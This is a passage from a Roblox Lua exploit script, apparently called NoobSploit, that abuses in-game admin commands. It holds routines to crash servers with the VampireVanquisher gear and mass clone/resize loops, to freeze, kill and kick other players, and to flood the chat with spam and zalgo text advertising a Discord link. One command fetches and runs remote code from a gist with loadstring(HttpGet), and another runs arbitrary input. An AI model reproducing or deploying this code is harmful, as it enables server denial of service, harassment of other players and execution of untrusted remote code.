		logn("BTS THE BEST BOY BAND ON EARTH")
		game.Players:Chat("fix")
		game.Players:Chat(prefix.."sm OMG BTS PLEASE NOTICE ME YOUR THE BEST BOY BAND ON EARTH")
		wait(0.3)
		game.Players:Chat("fogend 100")
		game.Players:Chat("fogcolor 250 0 500")
		game.Players:Chat("stun all")
		game.Players:Chat("unsize all")
		wait(0.3)
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("OMG BTS IS THE BEST BOY BAND","All")
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("MEET REAL BTS NOT SCAM!11!1!!!","All")
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("gg/PATnxvQ9Se","All")
		game.Players:Chat(":music 6126015059")
		wait(0.8)
		game.Players:Chat("m/OMG BTS PLEASE NOTICE ME!!!!")
		wait(0.3) 
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
	elseif string.sub(msg:lower(), 0, 100) == prefix.."loopgrab all" then
		regen()
		game.Players:Chat(".loopgrab 1")
		game.Players:Chat(".loopgrab 2")
		game.Players:Chat(".loopgrab 3")
		game.Players:Chat(".loopgrab 4")
		game.Players:Chat(".loopgrab 5")
		game.Players:Chat(".loopgrab 6")
		game.Players:Chat(".loopgrab 7")
		game.Players:Chat(".loopgrab 8")
		game.Players:Chat(".loopgrab 9")
	elseif string.sub(msg:lower(), 0, 6) == prefix.."boobs" then
		game.Players:Chat("hat me 14463468")
		game.Players:Chat("hat me 11679229")
		game.Players:Chat("hat me 5945909830")
		wait(2)
		loadstring(game:HttpGet('https://gist.githubusercontent.com/NoobSploit/effc563da20045407e512ee08489663e/raw/ef2d59b816cf81af657834c2eaa6fca85c373c85/boobs'))()
	elseif string.sub(msg:lower(), 0, 100) == prefix.."unloopgrab all" then
		game.Players:Chat(".unloopgrab 1")
		game.Players:Chat(".unloopgrab 2")
		game.Players:Chat(".unloopgrab 3")
		game.Players:Chat(".unloopgrab 4")
		game.Players:Chat(".unloopgrab 5")
		game.Players:Chat(".unloopgrab 6")
		game.Players:Chat(".unloopgrab 7")
		game.Players:Chat(".unloopgrab 8")
		game.Players:Chat(".unloopgrab 9")
		wait(.1)
		regen()
	elseif string.sub(msg:lower(), 0, 8) == prefix.."sunrise" then
		game.Players:Chat("colorshifttop 600 400 0")
		game.Players:Chat("colorshiftbottom 600 400 0")
		game.Players:Chat("time 7.15")
	elseif string.sub(msg:lower(), 0, 5) == prefix.."info" then
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I am a noob","All")
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Join me my fellow noobs. We will rule the world.","All")
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Want To Use NoobSploit? gg/PATnxvQ9Se","All")
	elseif string.sub(msg:lower(), 0, 7) == prefix.."sunset" then
		game.Players:Chat("colorshifttop 600 400 0")
		game.Players:Chat("colorshiftbottom 600 400 0")
		game.Players:Chat("time 17.15")
	elseif string.sub(msg:lower(), 0, 6) == "bring" then
		game.Players:Chat("tp "..player.." me")
	elseif string.sub(msg:lower(), 0, 6) == prefix.."dark" then
		game.Players:Chat("time 100")
		game.Players:Chat("outdoorambient 000 000 099")
		game.Players:Chat("brightness 000000000")
	elseif string.sub(msg:lower(), 0, 7) == prefix.."nochat" then
		game:GetService'Players':Chat((".spam h Z̳͍̩̻̙̪̲̞̭̦̙ͯ͛̂ͥͣͪͅͅͅa̲̬̪͙̖̬̖ͭͫͦ̀̄̆̍ͦͨͦ͗̅͋ͦͤͯͫ̔̚l̫̹̺̭̳͙̠̦͍̫̝͓͙̟̺͗̊̅ͬ̉͒̏͆͗͒̋ͤ̆̆ͥg̥̳̗͕̫̖͉̹̦̼̟ͪ͛̓̂ͫͮ̔͌̃̈͒̔̏ͭ͋͋ͅo̮̟̣͕͖͉̪͕̳͕͗͆̂͊̄͑̋̊̋ṯ̖͇̱̪̘͓͚̘̯̩͖͔̳͙͉̦̑̌ͪ̐ͦͭͯ̉ͭ͌̒ͩ͋e͍̣̘̖̣̪̘̭̟̮̬̙̘̙̜ͯͬ́̏ͨ͐ͯ̊́ͣͮ̅̄̈ͨ"))
	elseif string.sub(msg:lower(), 0, 10) == prefix.."clearchat" then
		say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
		say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
		say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
	elseif string.sub(msg:lower(), 0, 6) == prefix.."dg" then
		game.Players:Chat("colorshifttop 3243420 3243420 3243420")
		game.Players:Chat("colorshiftbottom 2550000 2160000 0")
		game.Players:Chat("ambient 0 0 216000000000000000")
		game.Players:Chat("time 7")
		game.Players:Chat("fogend 20")
		game.Players:Chat("disco")
	elseif string.sub(msg:lower(), 0, 3) == prefix.."cb" then
		game.Players:Chat("gear me 000000000000000000094794847")
		game.Players:Chat("gear me 000000000000000000094794847")
		game.Players:Chat("gear me 000000000000000000094794847")
		game.Players:Chat("gear me 000000000000000000094794847")
		game.Players:Chat("gear me 000000000000000000094794847")
		wait(1)
		game.Players:Chat(".alltools")
		logn("also once you put the tools away or drop server will go bye bye")
	elseif string.sub(msg:lower(), 0, 7) == prefix.."roblox" then
		game:GetService'Players':Chat(("char all 1"))
		game:GetService'Players':Chat(("name all Roblox"))
		game:GetService'Players':Chat(("music 499037728"))
	elseif string.sub(msg:lower(), 0, 6) == prefix.."crash" then
		if string.sub(msg:lower(), 0, 9) ==  prefix.."crashall" then
			logn("We've infact moved this command and its now called lagall :)")
		else
			logn("Just hold the tool your given xd (Expires in 10 seconds.)")
			game.Players:Chat("gear me 000000000000000000094794847")
			allowcrash = true
			Spawn(function()
				wait(10)
				allowcrash = false
				logn("VampireVanquisher Expired.")
			end)
			while true do
				if game.Players.LocalPlayer.Character:FindFirstChild("VampireVanquisher") then
					wait(0.25)
					for i = 1,100 do
						game.Players:Chat("size me 0000000000000000000.3")
					end
					game.Players:Chat("size me 10")
					game.Players:Chat("size me 10")
					game.Players:Chat("size me 10")
					game.Players:Chat("unsize me")
					game.Players:Chat("size me .3")
					game.Players:Chat("size me .3")
					game.Players:Chat("size me .3")
					game.Players:Chat("freeze me")
					game.Players:Chat("size me 10")
					game.Players:Chat("size me 10")
					game.Players:Chat("size me 10")
					game.Players:Chat("clone me")
					break
				end
				wait(0.05)
				if allowcrash == false then
					break
				end
			end
		end
	elseif string.sub(msg:lower(), 0, 11) == prefix.."bind fkick" then
		logn("fkick is now bound to '"..string.sub(msg:lower(), 13, 13).."'")
		fkick_keybind = string.sub(msg:lower(), 13, 13)
	elseif string.sub(msg:lower(), 0, 14) == prefix.."bind antikick" then
		logn("antikick is now bound to '"..string.sub(msg:lower(), 16, 16).."'")
		antikick_keybind = string.sub(msg:lower(), 16, 16)
	elseif string.sub(msg:lower(), 0, 13) == prefix.."bind respawn" then
		logn("respawn is now bound to '"..string.sub(msg:lower(), 15, 15).."'")
		respawn_keybind = string.sub(msg:lower(), 15, 15)
	elseif string.sub(msg:lower(), 0, 11) == prefix.."bind reset" then
		logn("reset is now bound to '"..string.sub(msg:lower(), 13, 13).."'")
		reset_keybind = string.sub(msg:lower(), 13, 13)
	elseif string.sub(msg:lower(), 0, 16) == prefix.."bind forcefield" then
		logn("forcefield is now bound to '"..string.sub(msg:lower(), 18, 18).."'")
		forcefield_keybind = string.sub(msg:lower(), 18, 18)
	elseif string.sub(msg:lower(), 0, 9) == prefix.."bind fly" then
		logn("fly is now bound to '"..string.sub(msg:lower(), 11, 11).."'")
		fly_keybind = string.sub(msg:lower(), 11, 11)
	elseif string.sub(msg:lower(), 0, 14) == prefix.."bind teleport" then
		logn("teleport is now bound to '"..string.sub(msg:lower(), 16, 16).."'")
		teleport_keybind = string.sub(msg:lower(), 16, 16)
	elseif string.sub(msg:lower(), 0, 8) == prefix.."boombox" then
		logn("Gave player a boombox!")
		local player = string.sub(msg:lower(), 10)
		if player ~= "" then
			game.Players:Chat("gear "..player.." 000000000000000000212641536")
		else
			game.Players:Chat("gear me 000000000000000000212641536")
		end
	elseif string.sub(msg:lower(), 0, 7) == prefix.."scrash" then
		game.Players:Chat("gear me 00000000000000094794847")
		wait(0.4)
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.VampireVanquisher)
		wait(0.2)
		game.Players:Chat("size me .3")
		game.Players:Chat("size me .3")
		game.Players:Chat("size me .3")
		game.Players:Chat("clone me")
	elseif string.sub(msg:lower(), 0, 8) == prefix.."vampire" then
		logn("Gave player a VG!")
		local player = string.sub(msg:lower(), 10)
		if player ~= "" then
			game.Players:Chat("gear "..player.." 00000000000000094794847")
		else
			game.Players:Chat("gear me 00000000000000094794847")
		end
	end

	if msg == ".ageofwar" then
		game:GetService'Players':Chat(("music 300067556"))
	end

	if msg == ".mrbluesky" or msg == ".Mrbluesky" then
		game:GetService'Players':Chat(("ambient 0 0 256"))
		game:GetService'Players':Chat(("colorshifttop 0 0 256"))
		game:GetService'Players':Chat(("fogcolor 0 0 256"))
		game:GetService'Players':Chat(("fogend 50"))
		game:GetService'Players':Chat(("music 2689506907"))
	end

	if msg == ".slide" or msg == ".Slide" then
		game:GetService'Players':Chat(("gear me 32356064"))
		game:GetService'Players':Chat(("gear me 19704064"))
	end

	if msg == "e" or msg == "E" then
		game:GetService'Players':Chat(("char me 47022"))
	end

	if msg == "PIANO" or msg == ":piano" then
		game:GetService'Players':Chat(("gear me 113299590"))
		game:GetService'Players':Chat(("gear me 113299590"))
		game:GetService'Players':Chat(("gear me 113299590"))
		game:GetService'Players':Chat(("gear me 113299590"))
		game:GetService'Players':Chat(("gear me 113299590"))
		game:GetService'Players':Chat(("gear me 113299590"))
		game:GetService'Players':Chat(("gear me 113299590"))
		game:GetService'Players':Chat(("gear me 113299590"))
		game:GetService'Players':Chat(("gear me 113299590"))
		game:GetService'Players':Chat(("gear me 113299590"))
	end

	if msg == "afk" or msg == "brb" then
		game:GetService'Players':Chat(("name me afk"))
		game:GetService'Players':Chat((":music 6805231279"))
		game:GetService'Players':Chat(("/e dance2"))
		game:GetService'Players':Chat(("ambient 200 50 200"))
		game:GetService'Players':Chat(("outdoorambient 375 0 0"))
	end

	if msg == "back" or msg == "Back" then
		game:GetService'Players':Chat(("music"))
		game:GetService'Players':Chat(("fix"))
		game:GetService'Players':Chat(("unname me"))
	end

	if string.sub(msg:lower(), 0, 10) == prefix.."bind pads" then
		logn("pads is now bound to '"..string.sub(msg:lower(), 13, 13).."'")
		pads_keybind = string.sub(msg:lower(), 13, 13)
	elseif string.sub(msg:lower(), 0, 14) == prefix.."bind attachto" then
		logn("attachto is now bound to '"..string.sub(msg:lower(), 16, 16).."'")
		AttachTO_keybind = string.sub(msg:lower(), 16, 16)
	elseif string.sub(msg:lower(), 0, 4) == prefix.."bok" then
		logn("Now making person bok...")
		wait(0.5)
		local Luser = string.sub(msg:lower(), 6)..","
		game.Players:Chat(prefix.."super dog "..string.sub(msg:lower(), 6)..","..string.sub(msg:lower(), 6)..","..string.sub(msg:lower(), 6)..","..string.sub(msg:lower(), 6)..","..string.sub(msg:lower(), 6)..","..string.sub(msg:lower(), 6)..","..string.sub(msg:lower(), 6)..","..string.sub(msg:lower(), 6)..","..string.sub(msg:lower(), 6)..","..string.sub(msg:lower(), 6)..","..string.sub(msg:lower(), 6)..","..string.sub(msg:lower(), 6)..","..string.sub(msg:lower(), 6)..","..string.sub(msg:lower(), 6)..","..string.sub(msg:lower(), 6))
		wait(3)
		game.Players:Chat("kill "..string.sub(msg:lower(), 6))
	elseif string.sub(msg:lower(), 0, 6) == prefix.."tkick" then
		logn("Atempting to kick")
		wait(0.5)
		local Luser = string.sub(msg:lower(), 8)..","
		game.Players:Chat(prefix.."super dog "..string.sub(msg:lower(), 8)..","..string.sub(msg:lower(), 8)..","..string.sub(msg:lower(), 8)..","..string.sub(msg:lower(), 8)..","..string.sub(msg:lower(), 8)..","..string.sub(msg:lower(), 8)..","..string.sub(msg:lower(), 8)..","..string.sub(msg:lower(), 8)..","..string.sub(msg:lower(), 8)..","..string.sub(msg:lower(), 8)..","..string.sub(msg:lower(), 8)..","..string.sub(msg:lower(), 8)..","..string.sub(msg:lower(), 8)..","..string.sub(msg:lower(), 8)..","..string.sub(msg:lower(), 8))
		wait(1)
		game.Players:Chat("kill "..Luser)
		wait(0.09)
		game.Players:Chat(prefix.."tesk "..string.sub(msg:lower(), 8))
	elseif string.sub(msg:lower(), 0, 5) == prefix.."trap" then
		logn("Trapped person!")
		game.Players:Chat("freeze "..string.sub(msg:lower(), 7))
		game.Players:Chat("name "..string.sub(msg:lower(), 7).." ")
		game.Players:Chat("thaw "..string.sub(msg:lower(), 7))
	elseif string.sub(msg:lower(), 0, 3) == prefix.."ds" then
		logn("Setting up dancing swords script!")
		game.Players:Chat("hat me 0000000000000000004506945409") -- Sword 1
		game.Players:Chat("hat me 0000000000000000004794315940") -- Sword 2
		game.Players:Chat("hat me 0000000000000000004315489767") -- Sword 3
		game.Players:Chat("hat me 0000000000000000004458601937") -- Sword 4
		game.Players:Chat("gear me 000000000000000000212641536") -- Boombox
	elseif string.sub(msg:lower(), 0, 4) == prefix.."lua" then
		loadstring(string.sub(msg:lower(), 6))()
	elseif string.sub(msg:lower(), 0, 12) == prefix.."moveobbybox" then
		if Stable_Check == false then
			logn("{Move.lua} Moving Obby Box")
			Stable_Check = true
			for i, v in pairs(Workspace_Folder["Obby Box"]:GetChildren()) do
				if v.CFrame.Y < 500 then
					repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

					local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					local looping = true

					spawn(function()
						while true do
							game:GetService('RunService').Heartbeat:Wait()
							game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
							cf.CFrame = v.CFrame * CFrame.new(-1*(v.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
							if not looping then break end
						end
					end)
					spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
					wait(0.3)
					looping = false
					game.Players:Chat("skydive me")
					wait(0.2)
					game.Players:Chat("respawn me")
					wait(0.2)
				end
			end
			wait(0.5)
			Stable_Check = false
			logn("{Move.lua} Done Moving Obby Box")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	elseif string.sub(msg:lower(), 0, 15) == prefix.."moveobbybricks" then
		game.Players:Chat(prefix.."nok")
		wait(0.05)
		if Stable_Check == false then
			logn("{Move.lua} Moving Obby Kill Bricks")
			Stable_Check = true
			for i, v in pairs(Workspace_Folder["Obby"]:GetChildren()) do
				if v.CFrame.Y < 500 then
					repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

					local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					local looping = true

					spawn(function()
						while true do
							game:GetService('RunService').Heartbeat:Wait()
							game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
							cf.CFrame = v.CFrame * CFrame.new(-1*(v.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
							if not looping then break end
						end
					end)
					spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
					wait(0.3)
					looping = false
					game.Players:Chat("skydive me")
					wait(0.2)
					game.Players:Chat("respawn me")
					wait(0.75)
				end
			end
			wait(0.5)
			Stable_Check = false
			logn("{Move.lua} Done Moving Obby Kill Bricks")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	elseif string.sub(msg:lower(), 0, 5) == prefix.."time" then
		time = getstring(1)
	elseif string.sub(msg:lower(), 0, 19) == prefix.."movebuildingbricks" then
		if Stable_Check == false then
			logn("{Move.lua} Moving Building Bricks")
			Stable_Check = true
			for i, v in pairs(Workspace_Folder["Building Bricks"]:GetChildren()) do
				if v.CFrame.Y < 500 then
					repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

					local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					local looping = true

					spawn(function()
						while true do
							game:GetService('RunService').Heartbeat:Wait()
							game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
							cf.CFrame = v.CFrame * CFrame.new(-1*(v.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
							if not looping then break end
						end
					end)
					spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
					wait(0.30)
					looping = false
					game.Players:Chat("skydive me")
					wait(0.2)
					game.Players:Chat("respawn me")
					wait(0.2)
				end
			end
			wait(0.5)
			Stable_Check = false
			logn("{Move.lua} Done Moving Building Bricks")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	elseif string.sub(msg:lower(), 0, 18) == prefix.."moveadmindividers" then
		if Stable_Check == false then
			logn("{Move.lua} Moving Admin Dividers")
			Stable_Check = true
			for i, v in pairs(Workspace_Folder["Admin Dividers"]:GetChildren()) do
				if v.CFrame.Y < 500 then
					repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

					local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					local looping = true

					spawn(function()
						while true do
							game:GetService('RunService').Heartbeat:Wait()
							game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
							cf.CFrame = v.CFrame * CFrame.new(-1*(v.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
							if not looping then break end
						end
					end)
					spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
					wait(0.3)
					looping = false
					game.Players:Chat("skydive me")
					wait(0.2)
					game.Players:Chat("respawn me")
					wait(0.2)
				end
			end
			wait(0.5)
			Stable_Check = false
			logn("{Move.lua} Done Moving Admin Dividers")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	elseif string.sub(msg:lower(), 0, 8) == prefix.."control" then
		local plr = string.sub(msg:lower(), 10)
		game.Players:Chat("dog me,"..plr)
		game.Players:Chat("tp me "..plr)
		wait(1)
		game.Players:Chat("punish me,"..plr)
		game.Players:Chat("undog me,"..plr)
		wait(0.25)
		game.Players:Chat("unpunish me,"..plr)
		game.Players:Chat("invis me")
	elseif string.sub(msg:lower(), 0, 10) == prefix.."fixhouse" then
		if Stable_Check == false then
			logn("{Move.lua} Moving House")
			Stable_Check = true
			for i, v in pairs(Workspace_Folder["Basic House"]:GetChildren()) do
				if v.CFrame.Y < 500 then
					repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

					local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					local looping = true

					spawn(function()
						while true do
							game:GetService('RunService').Heartbeat:Wait()
							game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
							cf.CFrame = v.CFrame * CFrame.new(-1*(v.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
							if not looping then break end
						end
					end)
					spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
					wait(0.3)
					looping = false
					game.Players:Chat("unskydive me")
					wait(0.2)
					game.Players:Chat("respawn me")
					wait(0.2)
				end
			end
			wait(0.5)
			Stable_Check = false
			logn("{Move.lua} Done Moving House")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	elseif string.sub(msg:lower(), 0, 10) == prefix.."movehouse" then
		if Stable_Check == false then
			logn("{Move.lua} Moving House")
			Stable_Check = true
			for i, v in pairs(Workspace_Folder["Basic House"]:GetChildren()) do
				if v.CFrame.Y < 500 then
					repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

					local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					local looping = true

					spawn(function()
						while true do
							game:GetService('RunService').Heartbeat:Wait()
							game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
							cf.CFrame = v.CFrame * CFrame.new(-1*(v.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
							if not looping then break end
						end
					end)
					spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
					wait(0.3)
					looping = false
					game.Players:Chat("skydive me")
					wait(0.2)
					game.Players:Chat("respawn me")
					wait(0.2)
				end
			end
			wait(0.5)
			Stable_Check = false
			logn("{Move.lua} Done Moving House")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	elseif string.sub(msg:lower(), 0, 9) == prefix.."movepads" then
		if Stable_Check == false then
			logn("{Move.lua} Moving Admin Pads")
			Stable_Check = true
			for i, v in pairs(Admin_Folder.Pads:GetDescendants()) do
				if v.Name == "Head" then
					if v.CFrame.Y < 500 then
						repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

						local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
						local looping = true

						spawn(function()
							while true do
								game:GetService('RunService').Heartbeat:Wait()
								game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
								cf.CFrame = v.CFrame * CFrame.new(-1*(v.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
								if not looping then break end
							end
						end)
						spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
						wait(0.3)
						looping = false
						game.Players:Chat("skydive me")
						wait(0.2)
						game.Players:Chat("respawn me")
						wait(0.2)
					end
				end
			end
			wait(0.5)
			Stable_Check = false
			logn("{Move.lua} Done Moving Admin Pads")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	elseif string.sub(msg:lower(), 0, 13) == prefix.."moveregenpad" then
		if Stable_Check == false then
			logn("{Move.lua} Moving Admin Reset Pad")
			Stable_Check = true
			if Admin_Folder.Regen.CFrame.Y < 500 then
				repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
				local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				local looping = true
				spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						cf.CFrame = Admin_Folder.Regen.CFrame * CFrame.new(-1*(Admin_Folder.Regen.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
						if not looping then break end
					end
				end)
				spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
				wait(0.3)
				looping = false
				game.Players:Chat("respawn others")
				wait(0.1)
				game.Players:Chat("setgrav others -9e9")
				wait(0.1)
				game.Players:Chat("tp me others")
				game.Players:Chat("respawn all")
				wait(0.1)
			end
			wait(0.5)
			Stable_Check = false
			logn("{Move.lua} Done Moving Admin Reset Pad")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	elseif string.sub(msg:lower(), 0, 9) == prefix.."movepads" then
		if Stable_Check == false then
			logn("{Move.lua} Moving Admin Pads")
			Stable_Check = true
			for i, v in pairs(Admin_Folder.Pads:GetDescendants()) do
				if v.Name == "Head" then
					if v.CFrame.Y < 500 then
						repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

						local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
						local looping = true

						spawn(function()
							while true do
								game:GetService('RunService').Heartbeat:Wait()
								game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
								cf.CFrame = v.CFrame * CFrame.new(-1*(v.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
								if not looping then break end
							end
						end)
						spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
						wait(0.3)
						looping = false
						game.Players:Chat("skydive me")
						wait(0.2)
						game.Players:Chat("respawn me")
						wait(0.2)
					end
				end
			end
			wait(0.5)
			Stable_Check = false
			logn("{Move.lua} Done Moving Admin Pads")
		else
			logn("{Move.lua} Already Moving, Please Wait")
		end
	elseif string.sub(msg:lower(), 0, 14) == prefix.."movebaseplate" then
		if Stable_Check == false then
			logn("{Move.lua} Moving Basteplate")
			Stable_Check = true
			if Workspace_Folder.Baseplate.CFrame.Y < 500 then
				repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
				local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				local looping = true
				spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						cf.CFrame = Workspace_Folder.Baseplate.CFrame * CFrame.new(-1*(Workspace_Folder.Baseplate.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
